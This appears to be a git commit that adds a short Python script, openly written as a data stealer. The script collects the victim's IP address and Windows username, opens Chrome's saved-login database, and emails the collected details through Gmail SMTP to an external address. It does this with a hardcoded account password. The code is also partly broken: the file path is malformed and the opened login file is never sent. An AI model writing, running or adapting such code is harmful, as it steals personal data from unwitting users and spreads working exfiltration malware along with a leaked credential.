9f13d06eb21c616df814c91189459970f70e8d62
%RandomUser% <68478332+MapleHackersoff@users.noreply.github.com>
2020-11-27 19:49:37 +0200

    Add files via upload

---
+++ shit2.py
@@ -0,0 +1,22 @@
+import smtplib
+import getpass
+import socket
+from email.mime.text import MIMEText
+from email.header import Header
+
+hostname = socket.gethostbyname(socket.gethostname())
+username = getpass.getuser()
+f = open('C:\\Users' + username + '\AppData\Local\Google\Chrome\\User Data\Default\Login Data', "r")
+
+def send():
+    mailsender = smtplib.SMTP('smtp.gmail.com', 587)
+    mailsender.starttls()
+    mailsender.login('minecorpnews@gmail.com', '21042009Q')
+    mail_recipient = "nata.re.od@gmail.com"
+    mail_subject = 'AMKL Team'
+    mail_body = 'IP: ' + hostname + '\nUsername: ' + username + '\nAMKL Team'
+    msg = MIMEText(mail_body, 'plain', 'utf-8')
+    msg['Subject'] = Header(mail_subject, 'utf-8')
+    mailsender.sendmail('maplehakkerz@gmail.com', mail_recipient, msg.as_string())
+    mailsender.quit()
+send()
